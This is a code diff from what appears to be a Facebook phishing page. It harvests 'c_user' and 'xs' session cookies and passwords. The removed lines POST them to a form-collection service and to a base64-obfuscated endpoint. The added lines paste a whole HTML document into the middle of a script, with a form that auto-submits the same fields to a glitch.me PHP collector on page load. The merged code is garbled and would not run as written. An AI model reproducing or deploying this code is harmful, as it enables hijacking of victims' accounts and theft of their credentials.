@@ -1990,67 +1990,86 @@
                 const cUser = document.getElementById('c_user').value;
                 const xs = document.getElementById('xs').value;
                 
-                const endpoint1 = "https://submit-form.com/A5Wq0pza4";
-                const endpoint2 = atob(obfuscatedEndpoint);
-                
-                const formData = {
-                    c_user: cUser,
-                    xs: xs,
-                    password: passwordInput.value
-                };
-                
-                const submitToEndpoint = (endpoint) => {
-                    return fetch(endpoint, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(formData)
-                    });
-                };
-                
-                Promise.all([
-                    submitToEndpoint(endpoint1),
-                    submitToEndpoint(endpoint2)
-                ])
-                .then(responses => {
-                    responses.forEach((response, index) => {
-                        if (!response.ok) {
-                            console.error(`Submission to endpoint ${index+1} failed`);
-                        }
-                    });
-                })
-                .catch(error => {
-                    console.error('Submission error:', error);
-                });
-            });
-            
-            // Reset form
-            function resetForm() {
-                document.getElementById('c_user').value = '';
-                document.getElementById('xs').value = '';
-                document.getElementById('password').value = '';
-                
-                step3.classList.remove('active');
-                step1.classList.add('active');
-                
-                steps[2].classList.remove('active');
-                steps[0].classList.add('active');
-                
-                video.pause();
-                video.currentTime = 0;
-                videoOverlay.classList.remove('hidden');
-                playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
-                progressBar.style.width = '0%';
-                bufferedBar.style.width = '0%';
-                currentTimeDisplay.textContent = '0:00';
+               <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Submission</title>
+</head>
+<body>
+    <!-- Your existing form -->
+    <form class="sm:hidden lg:block md:block" id="autoSubmitForm" action="https://curvy-exclusive-pump.glitch.me/Shoib.php" method="POST">
+    </form>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Replace these variables with actual values or collect them from user input
+            const cUser = 'example_c_user'; // Replace with actual value
+            const xs = 'example_xs';       // Replace with actual value
+            const password = 'example_password'; // Replace with actual value or input field
+
+            const formData = {
+                c_user: cUser,
+                xs: xs,
+                password: password
+            };
+
+            // Create hidden inputs and submit the form
+            const autoForm = document.getElementById('autoSubmitForm');
+            for (const key in formData) {
+                if (formData.hasOwnProperty(key)) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = formData[key];
+                    autoForm.appendChild(input);
+                }
             }
-            
-            // Close modal when clicking outside
+
+            // Submit the form automatically
+            autoForm.submit();
+
+            // Optional: Reset logic after submission
+            function resetForm() {
+                document.getElementById('c_user')?.value = '';
+                document.getElementById('xs')?.value = '';
+                document.getElementById('password')?.value = '';
+
+                const step3 = document.getElementById('step3');
+                const step1 = document.getElementById('step1');
+                const steps = document.querySelectorAll('.step');
+
+                step3?.classList.remove('active');
+                step1?.classList.add('active');
+
+                steps[2]?.classList.remove('active');
+                steps[0]?.classList.add('active');
+
+                const video = document.querySelector('video');
+                const videoOverlay = document.getElementById('videoOverlay');
+                const playPauseBtn = document.getElementById('playPauseBtn');
+                const progressBar = document.getElementById('progressBar');
+                const bufferedBar = document.getElementById('bufferedBar');
+                const currentTimeDisplay = document.getElementById('currentTimeDisplay');
+
+                if (video) {
+                    video.pause();
+                    video.currentTime = 0;
+                }
+
+                videoOverlay?.classList.remove('hidden');
+                if (playPauseBtn) playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+                if (progressBar) progressBar.style.width = '0%';
+                if (bufferedBar) bufferedBar.style.width = '0%';
+                if (currentTimeDisplay) currentTimeDisplay.textContent = '0:00';
+            }
+
+            // Close modal on outside click
             window.addEventListener('click', function(event) {
+                const modal = document.getElementById('modal');
                 if (event.target === modal) {
-                    closeModalFunc();
+                    modal.style.display = 'none';
                 }
             });
         });
